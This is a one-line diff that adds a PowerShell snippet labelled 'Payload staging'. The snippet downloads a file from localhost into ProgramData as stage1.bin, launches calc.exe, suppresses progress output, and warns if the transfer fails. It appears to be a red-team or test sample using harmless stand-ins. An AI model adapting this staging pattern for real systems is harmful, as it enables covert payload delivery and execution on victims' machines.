@@ -1,0 +1,1 @@
+<# Payload staging #> try { $FetchUrl = 'https://localhost:8080/assets/update.dat'; $DownloadPath = "C:\ProgramData\stage1.bin"; Invoke-WebRequest -Uri $FetchUrl -OutFile $DownloadPath -UseBasicParsing; & 'calc.exe'; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"; $ProgressPreference = "SilentlyContinue" } catch { Write-Warning "Stage transfer failed" }
